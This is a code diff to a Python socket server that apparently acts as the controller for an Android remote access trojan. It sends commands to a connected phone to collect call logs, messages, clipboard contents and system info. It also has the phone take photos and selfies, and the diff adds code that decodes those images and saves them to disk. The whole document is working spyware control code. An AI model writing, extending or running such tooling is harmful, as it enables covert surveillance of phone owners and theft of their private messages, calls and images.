@@ -3,6 +3,7 @@
 import os
 import socket
 import base64
+import datetime
 
 HOST = '0.0.0.0'
 PORT = 1337
@@ -26,12 +27,8 @@ def recvall(sock):
     while END_HEADER not in data:
         buffer = sock.recv(1024).decode("UTF-8", "ignore")
         data += buffer
+    data.replace(END_HEADER, "")    
     return data   
-
-#Give Base64 String and get image in current dir (aap chronology samjhiye)
-def makeImage(String):
-    
-    return String
 
 while True:
     dataSend = input(">>>") + "\n"
@@ -43,16 +40,22 @@ while True:
         break
     
     elif dataSend.strip() == "getCallLogs":
-        conn.send(dataSend.encode("UTF-8"))
+        conn.send(dataSend.encode("utf-8"))
         print(str(recvall(conn)))
     
-    elif dataSend.strip() == "getImage":
-        conn.send(dataSend.encode("UTF-8"))
-        print(str(recvall(conn)))
+    elif dataSend.strip() == "takePhoto":
+        conn.send(dataSend.encode("utf-8"))
+        file = open("Photo" + str(datetime.datetime.now()) + ".png", "wb")
+        file.write(base64.b64decode(recvall(conn)))
+        file.close()
+        print("Done...")
 
-    elif dataSend.strip() == "getSelfie":
-        conn.send(dataSend.encode("UTF-8"))
-        print(str(recvall(conn)))   
+    elif dataSend.strip() == "takeSelfie":
+        conn.send(dataSend.encode("utf-8"))
+        file = open("Selfie" + str(datetime.datetime.now()) + ".png", "wb")
+        file.write(base64.b64decode(recvall(conn)))
+        file.close()
+        print("Done...")
 
     elif dataSend.strip() == "getSystemInfo":
         conn.send(dataSend.encode("UTF-8"))
@@ -62,21 +65,19 @@ while True:
         conn.send(dataSend.encode("UTF-8"))
         print("Writing it to messages.txt")
         file = open("message.txt", 'a')
-        file.write("--------------------------------------")
+        file.write("--------------------------------------\n")
         messages_data = recvall(conn)
-        messages_data = messages_data.rstrip("\n")
-        print(messages_data)
-        file.write(base64.b64decode(messages_data).decode("UTF-8"))
+        file.write(base64.b64decode(messages_data).decode("utf-8"))
         file.close()
         print("Done...")
 
     elif dataSend.strip() == "getClipBoardContent":
-        conn.send(dataSend.encode("UTF-8"))
+        conn.send(dataSend.encode("utf-8"))
         print(str(recvall(conn)))
+#        //TODO Needs a fix on Android Code.
 
     else:    
-        conn.send(dataSend.encode("UTF-8"))
-        print(conn.recv(1024).decode("UTF-8"))
-        
+        conn.send(dataSend.encode("utf-8"))
+        print(conn.recv(1024).decode("utf-8"))
 
 conn.close()
